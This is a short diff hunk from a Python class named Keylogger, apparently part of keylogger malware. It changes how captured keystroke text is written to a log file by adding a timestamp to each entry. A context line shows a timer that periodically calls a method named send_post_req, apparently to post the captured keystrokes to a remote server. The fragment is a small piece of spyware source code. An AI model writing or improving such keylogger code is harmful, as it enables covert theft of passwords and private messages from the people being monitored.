@@ -44,7 +44,7 @@ class Keylogger:
                 if self.text == "":
                     archivo.write(f"\n[{datetime.datetime.now().isoformat(timespec='seconds')}] --- IGNORE ---\n")
 
-                archivo.write(self.text)
+                archivo.write(f"\n[{datetime.datetime.now().isoformat(timespec='seconds')}] {self.text}")
                 self.text = ""
             
             timer = threading.Timer(float(self.config["poll_seconds"]), self.send_post_req)
